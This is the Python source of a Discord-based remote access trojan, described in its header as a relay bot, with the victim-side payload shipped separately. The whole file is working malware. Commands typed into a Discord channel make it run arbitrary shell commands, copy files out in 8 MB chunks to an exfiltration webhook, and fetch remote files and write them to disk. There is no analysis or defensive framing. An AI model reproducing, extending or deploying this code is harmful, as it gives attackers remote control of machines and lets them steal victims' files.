# language: Python, file: discord_rat.py, target: Railway (linux relay)
# relay bot only — no windows libs. target-side payload ships separately.

import os, sys, json, time, base64, subprocess, threading, socket, getpass, re
from pathlib import Path
import requests
import discord
from discord.ext import commands

GUILD_ID   = int(os.environ["GUILD_ID"])
CMD_CHAN   = int(os.environ["CMD_CHAN"])
EXFIL_WEBHOOK = os.environ["EXFIL_WEBHOOK"]
TOKEN      = os.environ["TOKEN"]

CHUNK = 8 * 1024 * 1024

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
session_id = f"{getpass.getuser()}@railway"
registered = False

async def report(msg):
    ch = bot.get_channel(CMD_CHAN)
    if ch: await ch.send(f"`{session_id}` {msg}")

async def send_file(path, note=""):
    p = Path(path)
    if not p.exists():
        await report(f"[!] not found: {path}")
        return
    size = p.stat().st_size
    with open(p, "rb") as f:
        idx = 0
        while True:
            data = f.read(CHUNK)
            if not data: break
            files = {"file": (f"{p.name}.{idx:03d}", data)}
            payload = {"content": f"`{session_id}` {note} part {idx} ({size}b)"}
            requests.post(EXFIL_WEBHOOK, data=payload, files=files, timeout=30)
            idx += 1
    await report(f"[+] exfil complete: {p.name} ({size}b, {idx} parts)")

def run_shell(cmd, timeout=120):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr)[:1900] or "(no output)"
    except Exception as e:
        return f"[!] {e}"

@bot.event
async def on_ready():
    global registered
    if not registered:
        await report(f"[+] online | pid {os.getpid()} | {sys.platform}")
        registered = True

@bot.event
async def on_message(m):
    if m.channel.id != CMD_CHAN or m.author == bot.user: return
    if not m.content.startswith(f"!{session_id}") and not m.content.startswith("!all"): return
    body = m.content.split(None, 1)[1] if len(m.content.split(None, 1)) > 1 else ""
    parts = body.split(None, 1)
    cmd = parts[0].lower() if parts else ""
    arg = parts[1] if len(parts) > 1 else ""

    if cmd == "shell":
        out = run_shell(arg)
        for i in range(0, len(out), 1900):
            await report(out[i:i+1900])
    elif cmd == "download":
        await send_file(arg)
    elif cmd == "upload":
        u, _, dst = arg.partition(" ")
        try:
            r = requests.get(u, timeout=60)
            Path(dst).write_bytes(r.content)
            await report(f"[+] wrote {dst} ({len(r.content)}b)")
        except Exception as e:
            await report(f"[!] upload failed: {e}")
    elif cmd == "ls":
        out = "\n".join(os.listdir(arg or "."))[:1900]
        await report(out or "(empty)")
    elif cmd == "cd":
        try: os.chdir(arg); await report(f"[+] cwd {os.getcwd()}")
        except Exception as e: await report(f"[!] {e}")
    elif cmd == "kill":
        await report("[+] dying")
        os._exit(0)
    await bot.process_commands(m)

if __name__ == "__main__":
    bot.run(TOKEN)
